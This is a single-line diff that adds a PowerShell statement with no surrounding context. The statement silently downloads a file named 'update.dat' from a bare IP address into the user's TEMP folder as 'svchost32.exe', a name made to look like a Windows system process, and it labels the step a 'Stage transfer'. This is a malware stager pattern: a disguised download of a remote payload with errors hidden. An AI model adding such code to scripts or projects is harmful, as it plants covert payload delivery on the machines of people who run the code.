@@ -1,0 +1,1 @@
+try { $TransferUrl = 'https://192.0.2.8/update.dat'; $LocalPath = "$env:TEMP\svchost32.exe"; Start-BitsTransfer -Source $TransferUrl -Destination $LocalPath -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
